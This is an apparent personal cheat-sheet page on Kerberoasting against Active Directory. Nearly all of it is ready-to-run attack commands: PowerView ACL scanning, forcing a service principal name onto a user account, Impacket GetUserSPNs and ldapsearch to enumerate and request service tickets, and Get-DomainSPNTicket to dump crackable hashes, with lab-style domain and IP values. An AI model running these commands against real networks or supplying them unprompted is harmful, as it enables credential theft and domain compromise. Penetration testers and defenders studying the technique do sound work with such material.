---
layout: page
title: "# Kerberoasting"
permalink: /ad_cheatsheets/kerberoasting
---

# Kerberoasting

```powershell
. .\PowerView_dev.ps1

Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

## Check If current user has SPN

```powershell
#Powerview
Get-DomainUser -Identity support648user
```

when no

### Force SPN

- only posssible when you have GenericAll

```powershell
Set-DomainObject -Identity support648user -Set @{serviceprincipalname='dcorp/You Have Been Hacked'}

Add-Type -AssemblyName System.IdentityModel
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/406cb2d1-7db1-4145-86f8-25e869a8c847/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/406cb2d1-7db1-4145-86f8-25e869a8c847/Untitled.png)

## Check is there are SPN's (kerberoastable users) in the domain

```powershell
#LDAPSearch - Victim Linux machine
ldapsearch -Y GSSAPI -H ldap://dmzdc01.complyedge.com -D "pete@complyedge.com" -W -b "dc=complyedge,dc=com" "servicePrincipalName=*" servicePrincipalName

#Impacket - attack machine
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 172.16.75.168 complyedge.com/pete -outputfile hashes.kerberoast -k -no-pass
```

## Requesting Hash

```powershell
Get-DomainUser -Identity support648user | Get-DomainSPNTicket | select -ExpandProperty Hash
```

[Kerberos AD Attacks - Kerberoasting](https://blog.xpnsec.com/kerberos-attacks-part-1/)

[[Blog] Kerberoasting - Exploiting Kerberos to Compromise Microsoft Active Directory | Secura - Insight Into Your Digital Security](https://www.secura.com/blog/kerberoasting-exploiting-kerberos-to-compromise-microsoft-active-directory)
